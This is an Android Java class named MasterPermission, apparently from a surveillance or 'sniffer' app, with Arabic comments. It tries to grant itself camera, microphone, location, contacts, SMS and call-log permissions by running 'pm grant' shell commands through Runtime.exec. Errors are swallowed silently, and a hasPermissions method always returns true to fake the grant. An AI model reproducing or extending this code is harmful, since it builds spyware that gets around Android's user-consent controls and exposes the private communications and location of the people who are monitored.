package com.v8.global.sniffer;

import android.app.Activity;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.provider.Settings;
import android.widget.Toast;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.lang.reflect.Method;

public class MasterPermission {

    private Activity activity;
    
    public MasterPermission(Activity activity) {
        this.activity = activity;
    }

    public void grantAllPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                // محاولة استخدام ADB لمنح الصلاحيات (يتطلب صلاحيات خاصة)
                executeShellCommand("pm grant " + activity.getPackageName() + " android.permission.READ_EXTERNAL_STORAGE");
                executeShellCommand("pm grant " + activity.getPackageName() + " android.permission.WRITE_EXTERNAL_STORAGE");
                executeShellCommand("pm grant " + activity.getPackageName() + " android.permission.CAMERA");
                executeShellCommand("pm grant " + activity.getPackageName() + " android.permission.RECORD_AUDIO");
                executeShellCommand("pm grant " + activity.getPackageName() + " android.permission.ACCESS_FINE_LOCATION");
                executeShellCommand("pm grant " + activity.getPackageName() + " android.permission.READ_CONTACTS");
                executeShellCommand("pm grant " + activity.getPackageName() + " android.permission.READ_SMS");
                executeShellCommand("pm grant " + activity.getPackageName() + " android.permission.READ_CALL_LOG");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    private void executeShellCommand(String command) {
        try {
            Runtime.getRuntime().exec(command);
        } catch (Exception e) {
            // تجاهل الأخطاء
        }
    }

    public static boolean hasPermissions(Context context) {
        return true; // نخبر النظام دائماً أن لدينا الصلاحيات
    }
}
